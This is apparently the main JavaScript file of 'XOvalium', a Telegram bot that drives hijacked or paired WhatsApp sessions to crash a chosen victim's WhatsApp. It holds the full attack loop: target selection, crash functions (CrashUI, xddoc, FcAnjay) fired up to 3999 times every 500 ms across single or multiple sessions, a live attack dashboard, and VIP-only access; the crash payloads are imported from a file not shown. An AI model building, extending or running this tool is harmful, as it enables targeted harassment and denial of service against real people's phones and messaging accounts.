import { connectbot } from "./config/auth.js";
import { connectToWhatsApp, sessions } from "./plugins/baileys.js";
import pino from "pino";
import figlet from "figlet";
import axios from "axios";
import fsExtra from "fs-extra";
import path from 'path';
import chalk from "chalk";
import { resolve } from "dns";
import { text } from "stream/consumers";

const startTime = Date.now;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = connectbot();

// Handle polling errors to prevent crash
bot.on('polling_error', (error) => {
    console.error(`[Polling Error] ${error.code}: ${error.message}`);
});


import {
    CrashUI,
    TestPing,
    TestReaction,
    FcAnjay,
    xddoc
} from "./plugins/plugin-function.js";
import { match } from "assert";

const vipFile = path.join(process.cwd(), 'data', 'vip_users.json');
const activeLoops = new Map(); // chatId -> { status: boolean, target: string, type: string, count: number, mode: string, startTime: number }

// Helper to read/write VIPs
async function getVips() {
    try {
        return await fsExtra.readJson(vipFile);
    } catch {
        return [];
    }
}

const OWNER_ID = 5664727948; // Replace with your actual Telegram User ID

async function isVip(userId) {
    const vips = await getVips();
    return userId === OWNER_ID || vips.some(v => v.userId === userId);
}

async function addVip(userId, name) {
    const vips = await getVips();
    if (!vips.find(v => v.userId === userId)) {
        vips.push({ userId, name, addedAt: new Date().toISOString() });
        await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
    }
}

async function removeVip(userId) {
    let vips = await getVips();
    vips = vips.filter(v => v.userId !== userId);
    await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
}


bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userName = msg.from.username;

    await bot.sendVideo(chatId, "https://files.catbox.moe/bf2a8i.mp4", {
        caption: `
\`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${userName}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

\`\`\`
• 名前: XOʋαʅιυɱ
• バージョン: 1.0.0
• 言語: Indonesia
• コードネーム: HEN
\`\`\``,
parse_mode: "Markdown",
reply_markup: {
    inline_keyboard: [
        [{ text: "Settings", callback_data: "settings" }],
        [
            { text: "Crash Menu", callback_data: "crash_menu" },
            { text: "Source code", url: "https://github.com/Notzeyyyc/XOvalium" }
        ]
    ]
}
    });
});




bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;
    const username = query.from.username || query.from.first_name;

    if (data === 'settings') {
        const settingsCaption = `
\`\`\`
🚀 XOVALIUM SETTINGS
━━━━━━━━━━━━━━━━
Kelola fitur WhatsApp Anda lebih mudah!

[🔥] Featured Tools:
├ 📊 Realtime Analytics
├ 🔗 WA Device Manager
├ ⚡ Broadcast Blaster
└ 🤖 Auto-Reply Config

Status: 🟢 Online
\`\`\``;
        
        await bot.editMessageCaption(settingsCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Restart Session", callback_data: "restart_session" }],
                    [{ text: "🔙 Back to Main", callback_data: "back" }]
                ]
            }
        });
    } 
    
    if (data === 'back') {
        const mainCaption = `
\`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${username}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

\`\`\`
• 名前: XOʋαʅιυɱ
• バージョン: 1.0.0
• 言語: Indonesia
• コードネーム: HEN
\`\`\``;

        await bot.editMessageCaption(mainCaption, {
             chat_id: chatId,
             message_id: messageId,
             parse_mode: "Markdown",
             reply_markup: {
                inline_keyboard: [
                    [{ text: "Settings", callback_data: "settings" }],
                    [
                        { text: "Crash Menu", callback_data: "crash_menu" },
                        { text: "Source code", url: "https://github.com/Notzeyyyc/XOvalium" }
                    ]
                ]
            }
        });
    }

    if (data === "crash_menu") {
        const crashMenuCaption = `
  \`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${username}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

 \`\`\`
 /crash <number>
 \`\`\``;

        await bot.editMessageCaption(crashMenuCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Back to main", callback_data: "back" }]
                ]
            }
        })
    }

    if (data.startsWith('pick_func:')) {
        const [_, func, target] = data.split(':');
        await bot.editMessageCaption(`🎯 *Target:* \`${target}\`\n🔥 *Function:* \`${func}\`\n\nSilakan pilih mode pengiriman:`, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Single Session", callback_data: `start:${func}:1:${target}` },
                        { text: "Multi Session", callback_data: `start:${func}:2:${target}` }
                    ],
                    [{ text: "🔙 Cancel", callback_data: "back" }]
                ]
            }
        });
    }

    if (data.startsWith('start:')) {
        const [_, func, mode, target] = data.split(':');
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        
        if (activeLoops.has(chatId) && activeLoops.get(chatId).status) {
            return bot.answerCallbackQuery(query.id, { text: "⚠️ Ada serangan yang sedang berjalan!", show_alert: true });
        }

        const loopInfo = { 
            status: true, 
            target: target, 
            type: func, 
            count: 0, 
            mode: mode === '1' ? 'Single' : 'Multi', 
            startTime: Date.now() 
        };
        activeLoops.set(chatId, loopInfo);

        // Dashboard Message
        const sendDashboard = async () => {
            const duration = Math.floor((Date.now() - loopInfo.startTime) / 1000);
            const dashboard = `
🚀 *XOVALIUM ATTACK DASHBOARD*
━━━━━━━━━━━━━━━━━━━━
🎯 *Target:* \`${target}\`
🔥 *Function:* \`${func}\`
📡 *Mode:* \`${loopInfo.mode} Session\`
📊 *Sent:* \`${loopInfo.count}/3999\`
⏱️ *Uptime:* \`${duration}s\`
🟢 *Status:* \`Spamming...\`
━━━━━━━━━━━━━━━━━━━━
Gunakan /stop untuk menghentikan serangan.`;
            
            try {
                await bot.editMessageCaption(dashboard, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: "Markdown"
                });
            } catch (e) {
                // If caption hasn't changed or other error, just ignore
            }
        };

        await sendDashboard();
        const updateInterval = setInterval(() => {
            if (!activeLoops.has(chatId) || !activeLoops.get(chatId).status) {
                clearInterval(updateInterval);
                return;
            }
            sendDashboard();
        }, 5000);

        const runAttack = async (sock) => {
            while (activeLoops.has(chatId) && activeLoops.get(chatId).status && loopInfo.count < 3999) {
                try {
                    if (func === 'crash') {
                        await CrashUI(sock, jid);
                        await xddoc(sock, jid);
                    } else if (func === 'xddoc') {
                        await xddoc(sock, jid);
                    } else {
                        await FcAnjay(sock, jid);
                    }
                    loopInfo.count++;
                    await delay(500); // 500ms delay as requested
                } catch (err) {
                    console.error(`Error in attack loop:`, err.message);
                    await delay(2000);
                }
            }
            if (loopInfo.count >= 3999) {
                activeLoops.delete(chatId);
                bot.sendMessage(chatId, `✅ Serangan ke ${target} selesai (Limit 3999 tercapai).`);
            }
        };

        if (mode === '2') {
            if (sessions.size === 0) {
                activeLoops.delete(chatId);
                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi aktif.");
            }
            sessions.forEach(sock => runAttack(sock));
        } else {
            let sock = sessions.get('default');
            if (!sock && sessions.size > 0) sock = sessions.values().next().value;
            if (!sock) {
                activeLoops.delete(chatId);
                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi aktif.");
            }
            runAttack(sock);
        }
    }

    bot.answerCallbackQuery(query.id);
});

bot.onText(/\/connect(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];
    
    let phoneNumber = null;
    let sessionName = 'default';

    if (rawArgs.length > 0) {
        if (/^\d{8,15}$/.test(rawArgs[0])) {
             phoneNumber = rawArgs[0];
             if (rawArgs.length > 1) {
                 sessionName = rawArgs[1];
             }
        } else {
            sessionName = rawArgs[0];
        }
    }

    if (phoneNumber) {
        bot.sendMessage(chatId, `🔄 Menginisialisasi Pairing Code untuk nomor: ${phoneNumber} (Sesi: ${sessionName})...`);
    } else {
        bot.sendMessage(chatId, `🔄 Menginisialisasi QR Code untuk Sesi: ${sessionName}...`);
    }

    try {
        await connectToWhatsApp(bot, chatId, phoneNumber, sessionName);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `Gagal memulai koneksi WhatsApp untuk sesi ${sessionName}.`);
    }
});

bot.onText(/\/sessions/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, "⚠️ Belum ada sesi WhatsApp yang aktif.");
    }

    let message = "📋 *Daftar Sesi Aktif:*\n";
    sessions.forEach((sock, name) => {
        const user = sock.user ? sock.user.id.split(':')[0] : 'Connecting...';
        message += `- *${name}*: ${user}\n`;
    });

    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

bot.onText(/\/logout (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const sessionName = match[1].trim();

    if (sessions.has(sessionName)) {
        try {
            const sock = sessions.get(sessionName);
            await sock.logout();
            sessions.delete(sessionName);
            bot.sendMessage(chatId, `✅ Sesi *${sessionName}* berhasil diputus (Logout).`, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error(err);
            bot.sendMessage(chatId, `❌ Gagal logout sesi ${sessionName}.`);
        }
    } else {
        bot.sendMessage(chatId, `⚠️ Sesi *${sessionName}* tidak ditemukan.`, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/attack(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!(await isVip(userId))) {
        return bot.sendMessage(chatId, "⚠️ Maaf, perintah ini hanya untuk user VIP.");
    }

    const target = match[1]?.trim();
    if (!target) {
        return bot.sendMessage(chatId, "⚠️ Usage: /attack <target_number>");
    }

    await bot.sendVideo(chatId, "https://files.catbox.moe/bf2a8i.mp4", {
        caption: `🚀 *XOVALIUM ATTACK SYSTEM*\n━━━━━━━━━━━━━━━━━━━━\n🎯 *Target:* \`${target}\`\n\nSilakan pilih function yang ingin digunakan:`,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "CrashUI + xddoc", callback_data: `pick_func:crash:${target}` },
                    { text: "xddoc Only", callback_data: `pick_func:xddoc:${target}` }
                ],
                [
                    { text: "FcAnjay (Testing)", callback_data: `pick_func:fc_anjay:${target}` }
                ],
                [{ text: "❌ Cancel", callback_data: "back" }]
            ]
        }
    });
});

// Admin Commands
bot.onText(/\/addvip(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menambah VIP.");
    }

    const args = match[1] ? match[1].split(' ') : [];
    if (args.length < 2) {
        return bot.sendMessage(chatId, "⚠️ Format: `/addvip <userId> <name>`", { parse_mode: 'Markdown' });
    }

    const targetId = parseInt(args[0]);
    const name = args.slice(1).join(' ');

    await addVip(targetId, name);
    bot.sendMessage(chatId, `✅ Berhasil menambahkan *${name}* (${targetId}) ke daftar VIP.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/delvip(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menghapus VIP.");
    }

    const targetId = parseInt(match[1]);
    if (!targetId) {
        return bot.sendMessage(chatId, "⚠️ Format: `/delvip <userId>`", { parse_mode: 'Markdown' });
    }

    await removeVip(targetId);
    bot.sendMessage(chatId, `✅ Berhasil menghapus ID *${targetId}* dari daftar VIP.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/id/, (msg) => {
    bot.sendMessage(msg.chat.id, `ID Kamu: \`${msg.from.id}\`\nChat ID: \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (activeLoops.has(chatId)) {
        activeLoops.get(chatId).status = false;
        activeLoops.delete(chatId);
        bot.sendMessage(chatId, "✅ Serangan dihentikan.");
    } else {
        bot.sendMessage(chatId, "❌ Tidak ada serangan yang aktif untuk chat ini.");
    }
});

